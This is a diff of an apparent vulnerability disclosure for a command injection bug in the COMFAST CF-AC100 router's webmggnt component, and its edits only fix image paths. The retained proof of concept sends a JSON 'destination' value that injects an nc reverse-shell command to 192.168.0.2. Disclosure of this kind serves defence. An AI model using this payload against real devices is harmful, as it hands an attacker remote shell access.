@@ -14,11 +14,11 @@ A command injection vulnerability has been discovered in COMFAST CF-AC100 V2.6.0
 
 ### Vulnerability Details
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-17-17-39-b100ced0-ae76-419f-9430-a3312246f82e.png)
+![](../main/images/2026-02-23-17-17-39-b100ced0-ae76-419f-9430-a3312246f82e.png)
 
 The trigger point is located in the `sub_44AC14` method of the `webmggnt` component. Here, the `destination` field is not validated and is concatenated using `sprintf`, and then executed using `system`.
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-17-16-38-1430800a-32fc-4edd-b4c6-1290797305fc.png)
+![](../main/images/2026-02-23-17-16-38-1430800a-32fc-4edd-b4c6-1290797305fc.png)
 
 ### 概念验证
 
@@ -40,4 +40,5 @@ Cookie: language=sc; COMFAST_SESSIONID=0200a8c0-4261ffffffc85cffffff8a5f-6b8b456
 {"destination": "127.0.0.1\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.2 9999 >/tmp/f; #"}
 ```
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-17-18-34-image.png)
+![](../main/images/2026-02-23-17-18-34-image.png)
+
